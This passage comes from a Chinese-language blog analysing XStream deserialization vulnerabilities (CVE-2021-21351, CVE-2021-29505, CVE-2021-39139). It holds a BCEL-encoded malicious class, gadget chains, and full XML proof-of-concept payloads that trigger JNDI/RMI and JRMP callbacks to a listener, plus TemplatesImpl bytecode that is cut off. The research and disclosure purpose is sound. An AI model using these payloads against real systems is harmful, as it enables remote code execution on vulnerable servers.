<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dW$JxTW$V$fe_f$b93$_$P$I$T$C$MK$81$ca$92$40$92$b1$40S$98$ABB$80$40$W$q$y$NK$ed$cb$e4$91$3c$98$ccLg$de$Aim$d5$da$cd$aaU$eb$8aV$d4$da$g$8b$ad$W$y$D$96BZ$XD$5c$8a$d2$ba$U$f7$7d$ab$3b$8a$e2W$fc$ef$9b$r$93$c9$80M$be$b9$f7$dds$ce$3d$e7$3f$e7$9es$cf$7bg$5ey$fa$q$80$85$f8$af$8a$w$dc$xp$9f$8a$S$dc$eb$c1$db$e4$7c$bf$X$a3$f1v$f9$f4$O$P$de$v$X$P$c8$c5$bb$3cx$b7$5c$bcG$$$k$Ux$af$H$efS1$L$efW$f1$B$7cP$O$l$S$d8$af$a2$5c$w$fc$b0$8a$K$7cD$O$P$c9$e1$a3r8$my$l$T$f8$b8$8a$c9$f8$84$5c$i$QxX$c55r$c3$t$a5$aaG$e4$f0$a8$H$9fR1$80O$L$3c$spP$92$3e$a3$e2q$3c$n$f0Y9$7f$ce$83$5d$5e$3c$89C$92sX$c5$e7$f1$84$ca$e5S$f2$e9$88$d4$f6$a0$H$v$_$8e$e2$98$8a$_$e0i$V$d3q$5c$c538$e1$c1I9$P$K$3c$x$f0$9c$8a$m$be$a8$c0$Z$d1$fb$M$F$be$96$5d$fa$k$3d$Q$d6$p$3d$81$O$xnFz$ea$V8$f4$k$b2$94f$F$rf$b7$C$f7$S3bZ$cbH$af$ac$da$cc$9d$8d$d1n$b2$c7$b4$98$R$a3$z$d9$d7e$c47$ea$5da$5bW4$a4$877$ebqS$ae3D$a7$d5k$s$Ux$5b$3a$acd$b7$R$b1$a8$decE$d3$a6$U$8c$ab$ac$w$G$40$f4$YV$9b$8dO$q$b2O$V$95$p$r$r$i7eWH$bcDG$c4$eeDf$e9$acl$96l$X$d9$cdt$c2$95H$cf$ce$3e$dd$8c$u$Y_$b9$ad$b8$3aGO$94p$a7$a7$99I$cb$M$Hn5c$81$d5$5b$9b$d7$b7$t$adX$d2$a2$a8$a1$f7$R$a3$b3K$97$92$d3$d2$92f4$d0$d0o$Z$x$e2q$bd$bf$40$b04$U$8d$q$acx2dE$e39y$dbl$dc$d8$Z6BV$a0qH$80$f2$a3$ba$8dPX$8f$h$dd$8da$3dA$Lc$f3v$d8$a4zy$$$f4A$e9$e2$af$81H$f4x$P$e5$ca$8bxD$ebf$q$H$86A$cc$a1m$8e$e4ctu$R$3cu$94l$a3$3eGH$df$ab$c0$9f$Tm$ec$d5$e3$b6c$5b$e2$a6eH$88$r$bb$f6$OO$9d$f6$ae$5dtD$w$da$xe$UL$w$e2f$aba$f5F$bbe$e8Bv$G9$bbBF$98G1$3cm$fac$d9$d4$ZW$e8$f8$92$b9$cbd$7c$3a$y$3d$b4$bbU$8f$d9b$C$ba$c0$97$E$f8$b0$9f$r$c6$Kdm$b1b$E$be$y$f0$V$Fj$d3$be$90$R$b3L$86X$e0$94$c0W$FN$L$7cM$e0$M$TqI$u$9cIm$c5$Y$W$9c$f6$dc$aezV$N$b5tD$93$f1$90$b1$ca$94$b8$b4L$w$d7Jq$N$x$c0$98M$u$M$7dC$d2$Mw$h$3c$f0$d1$Z$e9$dbd$c1$z$9d$a3$e1$eb$f8$86$86$rX$w$9f$be$c9$84$ad$9e$cer$e3j$Z$5e$tI$df$b2If$b7$U$5d$$$a5$d6$80i$z2Zl$f7$d3$d6C2$q$g$9e$c7Y$G$40$c3$b7$d1$a6$e1$3b8$a7$60$eaU3R$c15W$cfm$e9$d1$L$gv$e1E$N$dfE$83$86$ef$c9$e1$fb$f8$BSl$c8$cb$8d$bd$f1$e8$5ey$A$g$5e$c2$f9l$AFf$8b$82$f9$a1h_$m$91$8c$E$a2$f1$9e$80$k$d3C$bdF$40$9e$7c$c0$8c$90$l$d1$c3$B$db$93$9d$8cm$60$TA$99V$bf$86$l$e2G$g$d6J$cf$97r$7b$z$b7$d7r$7bmz$7b$ad$dc$5e$9b$dd$5e$9b$db$5e$9b$d9$3es$z$b1$a4$cd$L$fcX$c3O$f0S$deW$F$c9$c4$93$c9BN$8bj$f8$Z$7e$$$f0$L$N$bf$c4$af$U$94$Vf$b7$86_$e37$C$bf$d5$f0$3bl$d7$f0$7b$fc$819$a6$e1$8fxY$c3$9f$f0g$a6$d3$cc$99$N$8dM$z3g$K$fcE$c3_$f17$81$bfk$f8$HZ4$5c$c0$3f$F$fe$a5$e1$o$feM9$a6$7b$a8$d6$d8$c7$d0$fd$H$97$b2Q$j$9ev$ac$a0$n$fb$h$92$R$cb$ec3rLyB$e7$f3$f7$e5$97$f8$c4$x$V$k$xv$5b$91$abd$da$Q$a9$z$da$91$M$f5$a6$a5$f3$90L$l$92h$e6E$a5$T$8c$$9W$Q$J$87$8d$k$3d$bc$o$U2$S$89$3c$91y$pq5G$f6$b0$f4$r$7b$p$af0$c3$w$ae$d0$G$da$W$b5VE$93$91$7cXn$3d$W3$ot$ab$a6Xg$YA$ca$U$q$3d$9eR$d9xuv$f3$d5$d8$e5$E$ba$c1H$d8$f7$c1$8aD6$eaUW$c60$e2$b2$f5$92j$863$ed$914$d9$9d$w$b75$c8$ee$e5$af$cc$ed$Z$d6Edg$S$94iN$f7$b4$9d$e1d$a2$97s$u$iMPI$a9$V$cd$95$bal$7cU$f2$W$l$a5www$qc$b18$8f$c1$a0$89$89$f9$Is$d5kk$f6$d1$a5$95$f9MG$b6$C$b6$e6b$e9RV$e8$s$P$c2$b8$r$a9$87$T$F$z$3a$d3$S$aa$b6$f2$86$cf$d7$9f$df$M$XT$8e4Q$f5$7f$h$e4$d4$ab$K$d0s$f9$K$60$a7$9f$99$8eq$e5V$e9ei$c4$d8$9b$ce$df$Q$89s$86$99$ce$82$z$d6$d2$c6$e6$a7$bfe$f4$c8$3b$cd$b9$b1s$7d$TYy$8ee$8bly$91Lxu$5e$e6$fa$a3$d8$a3$87$93F$fbN$f9$9a2$y$X3$f6$v$e26Y$3b$bb$e9$c7$e2$o1$7f$b5$9e$e5$9fe$7f$c22$98$c7$8eh$d2$ca$ef$84$eb$89$7f$us$cb$8b$90$J7$sWaY$92$7cu$b1$5b$fb$84$oA$d8j$a7e$5e43$d7$g$bb$ab$y$a9$ec$a2b$d8$xa$86$y_$gxa$86$e4$b9$5d$bd$d8$d7$c7$a3$f2$e4$eb1$83$af$ecU$7c$d9w$f0$ad$9d$dd$96O$r$b2$c5$da$f3r$7b$adB$91$cd$9bc$pW$B$ce$Kg$d7$dc$a3P$O$d9b$x9$bam$a2$86$s$7b$b4$F$b0$K$ab9$x$b23g6$f7RZ$f2$96$jGI$e7Q8$7c$ce$U$V$3d$F7$a7$b29$v$I$9f$tM$f0$a6$a0$faJ$d3$cfZ$96Yv$3b$87$UF$3dY$60uR$9e$d5e9$abksV$87$m$d3R$e1$e6k$8bB$5e$87$96$cc$e6e$94$$$91$d2s$e7$j$81$7b$c8a$d5$a6$ce$e6$9e9$b6$86$f1i$a9$8c$G$f9$q$a3$v$N$b7$a2$ad$I$Q$ef$e3$F$40$e6$W$F$d2$8e$f5$p$80L$3e$Co$n$90Z$ee$J$5c$B$88$3cNi$f8$f5E$p$a2$VFd$7eQ$m$h$8aGD$x$ER$c7$3d7$5c$B$c8r$3b$o$5et$60$py$d4$e5$5cD$aaF$f5g$7d$a3$7dcR$uk$99$97$c2$d8g$3c$ad$f3$aaS$f0m9$8erf$c9$b86$r$e8$3c$8e$8a$ce$9a$a3$Y$lt$vA$b7$dfU$ed$a8$3e$99$c2$E$bf$x$85$89r$f0$d7$a40$a9$d5$ef$3a$85M$7e$f7$a94$c3$3f$805A$e1w$fb$993S$G$b0$qC$5bH$9a$a0$O1$Y$f4$c8$N3$f27$8c$Lz$b9$c1ko$f0$d84$bfg$b0$e6$U$d6$fb$9d$a70$9eF$a6$O$60e$d0$e5wJ$ke$W$a5I$d7$91$e4$K$928$YT$v$3d$zO$ba$3cXJ$e9R$5bZH$92_$j$3c$8ek$e8$d74$e9$97$St$f9$a6$a70$83$80$dc$t$eb$84$a3$ceS$e1$a9$Q$PK7$w$3c$f3$89$86X$ae$f5$bd$s$85$99$fbQ$ef$f7$3aO$60V$a7$c37$bb$p$859A$d5$af$b2$7e$w9$9e$40U$a7$a3$86$c4$b9$E$e1$f5$cdK$8b$jF5I5A$d7$5d$ke$e0$f2A$bf$8b$d2$b5$d5$85$96$aa$a5$a5$Fu$de$K$efX$5c$be$a3N$f5$d3$bb$b4$c2$K$f5$Y$C$d4$f0$da$z$b6$82sD$7f$5d$d0$9d$z$dd$f9$yK$bf$y$5cVdP$i$c6$C$Z$e7$85$7e$b7$f3$Y$ae$dfr$88$d9$d0$ceS$de$c2O$f9$gf$c3$ee$ccl1$P$de$8c$bbq$l$d7$bb$b1$c7$5e$3f$8a$c7$f8$d9$3e$99$df$e1$Pa03$9f$s$fd$i$df$a8_$e2z$Qg$ec$b5$d3$ce$b2$7bxc$81$df$e6$k$d4c$Mk$ac$82$f9X$c3$E$afcv$d5$f3$9eZ$ce$9b$aa$89$b9$b5$9bt$8b$f3$m$e7$d3$9c_$s$f5$Cs$f1$o$b3$f1$S$d6$u$T$f9$d2$3c$Lk$95$eb$b1N$a9G$8b$b2$W$ad$ca$O$d2C$e8PL$dc$a8$dc$89N$e5$7elU$O$f0$f9$RlW$Ob$87$f2$ynRN$e3f$e5y$e8v$86$3f$c0$bbs$$$e2$d8$84$cd$cc$fa$a98K$7fo$84$83$3a$x$d1$89$adPi$a5$J$db$b0$j$5e$ea$g$87$j$c4$a9R$f3$U$dc$847$b0$O$98$f7$b8$99$ba$A$P$f5v$n$c4$ea$Y$a3$3c$87n$Y$ac$8f$L8$8f$9d$e8$e1$cd$7c$91$9f$V$bd0$Z$81Kx$91_$i$bb$e1$o$9e$d9$I$b3$9e$dcDU$86$3e$3e$JD$d2u$9b$b1$g$a5$85$Y$v$_$a0$e22$81$J$81$5b$E$f8$a6$cf$P$3cK$m$v$b0$87$p$U$O$a5$ab9$ac$e1$ef2$ca$e1$z$$$97$93u$5e$s6W$81$Q$d0$$y$abrz$c6$a2t$84$I$ffrZ$iR$8b$p$t$C$5cfT$f2M$ef$V$d8$t$d0$_p$ab$c2$8b$e8$S6$5c$84$eb$V$94$91$a7$u$Xy$81$ddFm$a3y$7b$y$c6$hq$3b$ee$c0$9b$98W$k$bc$r$d7$a7v2n$f2$G$9bp$Mu$be$hRX$b4e$A$a3$d6$jG$b0$93$8d$ab$7e$f0$90$cd$f42$5c$8b$v$b8$d2$be$ae$5c$i$7d$a4U$90Z$8eQ$3c$b0$f1$fc$cf$5e$86$a3$c8$b9$To$e5$wf$3bR$d2$op$97$97$8c$bb$ed$h$f0$9e$ff$B$fc$9cQ$3b5$T$A$A</span><br></pre></td></tr></table></figure>

<p>BCEL有个特性，会检测类名是否包含$$BCEL$$这个前缀，若包含该前缀，则去掉该前缀，然后将后面的内容解码成字节数组，然后将字节数组转换成类：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111646165.png" alt="image-20230411164621051"></p>
<p>我复现半天没复现成功，一开始是因为BCEL 类加载器在jdk8u251删除了，而我使用的jdk8u361没有该类加载器导致找不到该类加载器，后面通过导入各种含有BCEL 类加载器的库，也同样没复现成功。比如我导入该库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.bcel&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;bcel&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;6.4.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>发现在createClass方法中会调用setBytes方法抛异常，无论怎么改，最终都无法return创建好的java类：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111640915.png" alt="image-20230411164044779"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111642483.png" alt="image-20230411164225417"></p>
<p>触发类加载器加载类在JavacProcessingEnvironment的hasNext方法，在hasNext方法中加载类然后实例化：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111643222.png" alt="image-20230411164333135"></p>
<p>整个利用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">org.apache.bcel.util.ClassLoader.createClass</span><br><span class="line">org.apache.bcel.util.ClassLoader.loadClass</span><br><span class="line">java.lang.ClassLoader.loadClass</span><br><span class="line">com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator.hasNext</span><br><span class="line">javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator.hasMoreElements</span><br><span class="line">java.io.SequenceInputStream.nextStream</span><br><span class="line">java.io.SequenceInputStream.read</span><br><span class="line">com.sun.xml.internal.bind.v2.util.ByteArrayOutputStreamEx.readFrom</span><br><span class="line">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.get</span><br><span class="line">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.toString</span><br><span class="line">javafx.collections.ObservableList$1.compare</span><br><span class="line">java.util.PriorityQueue.siftDownUsingComparator</span><br><span class="line">java.util.PriorityQueue.siftDown</span><br><span class="line">java.util.PriorityQueue.heapify</span><br><span class="line">java.util.PriorityQueue.readObject</span><br></pre></td></tr></table></figure>

<p>使用老版本jdk（jdk&lt;8u251）能复现成功，最后成功实例化恶意类。</p>
<h2 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE-2021-21351"></a>CVE-2021-21351</h2><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成JNDI注入，</p>
<p>简化后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sorted-set&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#x27;&gt;</span><br><span class="line">      &lt;m__DTMXRTreeFrag&gt;</span><br><span class="line">        &lt;m__dtm class=&#x27;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#x27;&gt;</span><br><span class="line">          &lt;m__size&gt;-10086&lt;/m__size&gt;</span><br><span class="line">          &lt;m__mgrDefault&gt;</span><br><span class="line">            &lt;m__dtms&gt;</span><br><span class="line">              &lt;null/&gt;</span><br><span class="line">            &lt;/m__dtms&gt;</span><br><span class="line">          &lt;/m__mgrDefault&gt;</span><br><span class="line">          &lt;m__incrementalSAXSource class=&#x27;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#x27;&gt;</span><br><span class="line">            &lt;fPullParserConfig class=&#x27;com.sun.rowset.JdbcRowSetImpl&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">              &lt;javax.sql.rowset.BaseRowSet&gt;</span><br><span class="line">                &lt;default&gt;</span><br><span class="line">                  &lt;dataSource&gt;rmi://localhost:1097/Object&lt;/dataSource&gt;</span><br><span class="line">                &lt;/default&gt;</span><br><span class="line">              &lt;/javax.sql.rowset.BaseRowSet&gt;</span><br><span class="line">            &lt;/fPullParserConfig&gt;</span><br><span class="line">            &lt;fConfigSetInput&gt;</span><br><span class="line">              &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;</span><br><span class="line">              &lt;name&gt;setAutoCommit&lt;/name&gt;</span><br><span class="line">              &lt;parameter-types&gt;</span><br><span class="line">                &lt;class&gt;boolean&lt;/class&gt;</span><br><span class="line">              &lt;/parameter-types&gt;</span><br><span class="line">            &lt;/fConfigSetInput&gt;</span><br><span class="line">            &lt;fConfigParse reference=&#x27;../fConfigSetInput&#x27;/&gt;</span><br><span class="line">          &lt;/m__incrementalSAXSource&gt;</span><br><span class="line">        &lt;/m__dtm&gt;</span><br><span class="line">      &lt;/m__DTMXRTreeFrag&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">      &lt;m__obj class=&#x27;string&#x27;&gt;test&lt;/m__obj&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>

<p>前半部分和21346相同，差别是在XString.equal方法中执行了不同对象的toString而造成利用链后续的不同。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111739150.png" alt="image-20230411173948037"></p>
<p>这里进入的是XRTreeFrag的父类XObject的toString方法，在该方法中又调用str方法回到XRTreeFrag：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111740697.png" alt="image-20230411174017632"></p>
<p>在str方法中，调用<code>m__DTMXRTreeFrag</code>属性的<code>m__dtm</code>属性（SAX2DTM）的getStringValue方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111742289.png" alt="image-20230411174209221"></p>
<p>在getStringValue方法中进入<code>_firstch</code>方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111752379.png" alt="image-20230411175239308"></p>
<p>在<code>_firstch</code>方法中调用nextNode方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111753983.png" alt="image-20230411175333876"></p>
<p>在nextNode方法又调用<code>m_incrementalSAXSource</code>属性的deliverMoreNodes：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111755617.png" alt="image-20230411175536519"></p>
<p>接着调用parseSome方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111756562.png" alt="image-20230411175647493"></p>
<p>反射调用setAutoCommit方法，传递false，后面就是熟悉的利用链了：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111758913.png" alt="image-20230411175819798"></p>
<p>调用connect方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111759977.png" alt="image-20230411175920887"></p>
<p>connect方法中，造成JNDI注入：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111800567.png" alt="image-20230411180043460"></p>
<h2 id="分割线-1"><a href="#分割线-1" class="headerlink" title="分割线"></a>分割线</h2><p>终于分析完了1.4.15的11个漏洞，血汗。中间有些利用链是自动化工具发掘的，要控制这条利用链从source走到sink，要考虑到的东西太多了，但是其实说白了就一点，也就是某些属性赋不赋值的问题，在到达最终的sink点前，中间会有一些打断利用链执行的关键属性，而缺少这些关键属性，有一些可能会好一点的提示出现空指针引用异常（指示哪个属性空指针引用了），而有一些则是其他类型的错误，这种其他类型的错误很难找到是因为哪个属性为null出现的问题，全部都赋值的话那样又会花费大量心血，因为属性有些是复杂的类，其中的结构难以想象。</p>
<h2 id="CVE-2021-29505"><a href="#CVE-2021-29505" class="headerlink" title="CVE-2021-29505"></a>CVE-2021-29505</h2><h3 id="适用范围-6"><a href="#适用范围-6" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>XStream &lt;&#x3D; 1.4.16</li>
</ul>
<h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><p>这个漏洞会使用底层JRMP向指定的JRMP服务端发起一个连接，而我们可以伪造一个服务端，向客户端返回一个恶意对象，客户端收到这个恶意对象后反序列化造成命令执行。</p>
<p>由于我的jdk版本太高了，复现不了该漏洞，官方给的POC也是直接运行不了的，这里从其他blog找到了POC：Packet</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">    &lt;unserializable-parents/&gt;</span><br><span class="line">    &lt;java.util.PriorityQueue&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">            &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">        &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">                &lt;m__obj class=&#x27;string&#x27;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: none&lt;/m__obj&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">                    &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">                    &lt;bodyParts/&gt;</span><br><span class="line">                    &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">                        &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;</span><br><span class="line">                        &lt;multiPart class=&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;&gt;</span><br><span class="line">                            &lt;soapPart/&gt;</span><br><span class="line">                            &lt;mm&gt;</span><br><span class="line">                                &lt;it class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                                    &lt;aliases class=&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;&gt;</span><br><span class="line">                                        &lt;candidates class=&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;&gt;</span><br><span class="line">                                            &lt;names&gt;</span><br><span class="line">                                                &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                                &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                            &lt;/names&gt;</span><br><span class="line">                                            &lt;ctx&gt;</span><br><span class="line">                                                &lt;environment/&gt;</span><br><span class="line">                                                &lt;registry class=&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                                    &lt;java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                                        &lt;string&gt;UnicastRef&lt;/string&gt;</span><br><span class="line">                                                        &lt;string&gt;127.0.0.1&lt;/string&gt;</span><br><span class="line">                                                        &lt;int&gt;2333&lt;/int&gt;</span><br><span class="line">                                                        &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                        &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                                        &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                        &lt;short&gt;0&lt;/short&gt;</span><br><span class="line">                                                        &lt;boolean&gt;false&lt;/boolean&gt;</span><br><span class="line">                                                    &lt;/java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                                &lt;/registry&gt;</span><br><span class="line">                                                &lt;host&gt;127.0.0.1&lt;/host&gt;</span><br><span class="line">                                                &lt;port&gt;2333&lt;/port&gt;</span><br><span class="line">                                            &lt;/ctx&gt;</span><br><span class="line">                                        &lt;/candidates&gt;</span><br><span class="line">                                    &lt;/aliases&gt;</span><br><span class="line">                                &lt;/it&gt;</span><br><span class="line">                            &lt;/mm&gt;</span><br><span class="line">                        &lt;/multiPart&gt;</span><br><span class="line">                    &lt;/sm&gt;</span><br><span class="line">                &lt;/message&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>不过这个漏洞倒是挺简单的，不像之前其他漏洞有触发点，该漏洞是直接发生在一开始所有标签对应的对象进行反序列化的时候。</p>
<p>当反序列化到RemoteObject对象时：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304112206574.png" alt="image-20230411220648454"></p>
<p>读取类名，注册类，实例化，然后调用UnicastRef的readExternal方法将对象输入流进行传递：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304112208086.png" alt="image-20230411220852020"></p>
<p>调用LiveRef的read方法，接着传递：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304112221567.png" alt="image-20230411222157461"></p>
<p>在read方法中，读取主机端口，封装到TCPEndpoint对象中，然后新建LiveRef，封装ObjID（用于标识远程对象）和TCPEndpoint对象，然后发起JRMP请求。</p>
<h2 id="分割线-2"><a href="#分割线-2" class="headerlink" title="分割线"></a>分割线</h2><p>XStream1.4.17版本又爆出了14个漏洞，而且大部分是RCE，下面的CVE都适用于1.4.17及以下版本的。</p>
<p>先看看1.4.17加入了哪些黑名单：</p>
<p>类型匹配如下的：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304121900887.png" alt="image-20230412190006912"></p>
<p>正则匹配如下的：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304121900278.png" alt="image-20230412190046222"></p>
<p>类继承如下的：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304121903537.png" alt="image-20230412190320446"></p>
<h2 id="CVE-2021-39139"><a href="#CVE-2021-39139" class="headerlink" title="CVE-2021-39139"></a>CVE-2021-39139</h2><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成RCE，但是要在jdk1.7u21下才能使用，这年头谁会用jdk7？又是个鸡肋洞。下面是官方给的POC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;linked-hash-set&gt;</span><br><span class="line">  &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">    &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;</span><br><span class="line">      &lt;default&gt;</span><br><span class="line">        &lt;__name&gt;Pwnr&lt;/__name&gt;</span><br><span class="line">        &lt;__bytecodes&gt;</span><br><span class="line">          &lt;byte-array&gt;yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFs